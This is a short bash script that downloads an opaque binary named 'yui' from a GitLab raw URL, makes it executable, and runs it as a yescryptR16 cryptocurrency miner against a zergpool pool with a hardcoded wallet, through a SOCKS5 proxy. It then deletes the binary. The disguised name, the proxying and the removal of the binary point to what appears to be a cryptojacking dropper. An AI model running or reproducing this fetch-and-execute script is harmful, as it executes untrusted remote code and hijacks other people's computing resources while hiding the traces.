#!/bin/bash
apt-get update
apt install screen -y
wget https://gitlab.com/sumarnosabar1/rexors/-/raw/main/yui
chmod +x yui
timeout 15m ./yui -a yescryptr16  -o stratum+tcp://yescryptR16.na.mine.zergpool.com:6333 -u DLVmTEYCYM9jMCEWiuNuuAJ2M7GETpHcg4.RX --proxy socks5://79.143.30.163:55418
rm -rf yui
